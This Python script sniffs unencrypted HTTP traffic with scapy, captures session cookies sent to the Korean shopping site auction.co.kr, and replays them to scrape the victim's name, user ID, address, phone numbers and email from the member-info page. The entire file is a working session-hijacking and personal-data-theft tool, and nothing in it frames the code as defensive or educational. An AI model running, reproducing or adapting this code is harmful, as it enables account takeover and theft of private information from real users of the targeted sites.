#-*- coding:utf-8 -*-
from selenium import webdriver
from bs4 import BeautifulSoup
from platform import system
from scapy.all import *
import os
import requests
import pdb

#browser = webdriver.PhantomJS(executable_path='/usr/local/share/phantomjs-1.9.7-linux-x86_64/bin/phantomjs')
#if system() == 'Windows':
#    browser = web.driver.phantomjs()

#f=open("output.html","wb");

def get_cookie(packet):
    cookie_data=[]

    interpark=re.compile("Host: (.*interpark.com)\r\n")
    auction=re.compile("Host: (.*auction.co.kr)\r\n")

    try:
        if packet.haslayer("TCP"):
            try:
                packet_payload = packet.getlayer("TCP").payload.load.decode()
            except:
                return

            if len(auction.findall(packet_payload)) != 0:
                cookie_starting_point = packet_payload.find("Cookie: ")
                if cookie_starting_point != -1:
                    cookie_ending_point = packet_payload.find("\x0d\x0a", cookie_starting_point)
                    cookie_data = packet_payload[cookie_starting_point : cookie_ending_point]
                    if len(cookie_data) != 0:
                        cookie_data=cookie_data[8:]
                        parse_cookie(cookie_data)
    except:
        pass

def parse_cookie(cookie_data):
    cookie_dict={}
    cookie_list=[]

    if len(cookie_data) != 0:
        cookie_list = cookie_data.split('; ')
        for cookie in cookie_list:
            spliter = cookie.find("=")
            cookie_name = cookie[:spliter]
            end_point = cookie.find(";")

            if end_point != -1:
                cookie_value = cookie[spliter + 1 : -1]
            else:
                cookie_value = cookie[spliter + 1 :]

            cookie_dict[cookie_name] = cookie_value

    auction_crawling(cookie_dict)


def auction_crawling(cookie_dict):
    #f.write(cookie_dict)
    url = 'https://memberssl.auction.co.kr/membership/MyInfo/MyInfo.aspx'
    request = requests.get(url, cookies=cookie_dict)
    data = request.content
    soup = BeautifulSoup(data, 'lxml')

    userid = soup.findAll('span', attrs={'id':'lblMemberId'})
    username = soup.findAll('span', attrs={'id':'lblMemberName'})

    username = username[0].text
    userid = userid[0].text

    ip_line2 = soup.findAll('td', attrs={'class':'ip line2'})

    address= ip_line2[0].findAll('input')

    address_1 = address[0]['value'].encode('utf-8')
    address_2 = address[1]['value'].encode('utf-8')
    address_3 = address[2]['value'].encode('utf-8')

    ddl_home_tel = soup.findAll('select', attrs={'name':'ddlHomeTel'})
    ddl_home_tel = ddl_home_tel[0].findAll('option', attrs={'selected':'selected'})
    home_tel_1 = ddl_home_tel[0]['value'].encode('utf-8')

    info = soup.findAll('div', attrs={'class':'input1'})
    
    txt_home_tel2 = info[0].findAll('input', attrs={'name':'txtHomeTel2'})
    txt_home_tel3 = info[1].findAll('input', attrs={'name':'txtHomeTel3'})
    txt_mobile_tel2 = info[2].findAll('input', attrs={'name':'txtMobileTel2'})
    txt_mobile_tel3 = info[3].findAll('input', attrs={'name':'txtMobileTel3'})

    
    home_tel_2 = txt_home_tel2[0]['value'].encode('utf-8')
    home_tel_3 = txt_home_tel3[0]['value'].encode('utf-8')
    mobile_tel_2 = txt_mobile_tel2[0]['value'].encode('utf-8')
    mobile_tel_3 = txt_mobile_tel3[0]['value'].encode('utf-8')

    ddl_mobile_tel = soup.findAll('select', attrs={'name':'ddlMobileTel'})
    ddl_mobile_tel = ddl_mobile_tel[0].findAll('option', attrs={'selected':'selected'})

    mobile_tel_1 = ddl_mobile_tel[0]['value'].encode('utf-8')
   
    txt_email_id = info[4].findAll('input', attrs={'name':'txtEmailId'})
    txt_email_domain = info[5].findAll('input', attrs={'name':'txtEmailDomain'})
    
    email_id = txt_email_id[0]['value'].encode('utf-8')
    email_domain = txt_email_domain[0]['value'].encode('utf-8')

    print username, userid
    print home_tel_1,"-", home_tel_2,"-", home_tel_3
    print mobile_tel_1,"-", mobile_tel_2,"-", mobile_tel_3
    print email_id,"@", email_domain
    print address_1, address_2, address_3

'''
    browser.add_cookie(cookie_dict)
    browser.get(url)
    soup = BeautifulSoup(browser.page_source)
'''

if __name__=='__main__':
   # filename = raw_input("Input FIle Name : ")
    #now_path = os.path.dirname(os.path.abspath(__file__))
    #pcap_path = os.path.join(now_path, filename)
    #pcap = rdpcap(pcap_path)
    
    sniff(iface='eth0', prn=get_cookie, filter="tcp port 80")
'''
    for packet in pcap:
        cookie_dict={}
        cookie_data=[]
        if packet.haslayer("TCP"):
            cookie_data = get_cookie(packet)
            if cookie_data is not None :
                cookie_dict = parse_cookie(cookie_data)
                auction_crawling(cookie_dict)
'''
